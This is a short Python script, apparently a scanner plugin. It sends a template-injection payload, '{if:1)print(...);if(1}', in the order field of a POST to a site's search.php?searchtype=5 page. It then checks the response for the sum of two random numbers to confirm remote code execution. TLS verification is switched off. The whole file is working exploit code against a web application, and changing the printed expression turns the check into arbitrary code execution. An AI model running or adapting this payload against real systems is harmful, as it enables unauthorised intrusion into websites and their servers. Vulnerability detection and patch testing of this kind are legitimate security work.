import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand1=randomInt(200000000, 210000000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand2=randomInt(200000000, 210000000)
def doCheck(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"search.php?searchtype=5"
	body="searchtype=5&order=}{end if} {if:1)print("+str(rand1)+"%2b"+str(rand2)+");if(1}{end if}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if str(rand1 + rand2) in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
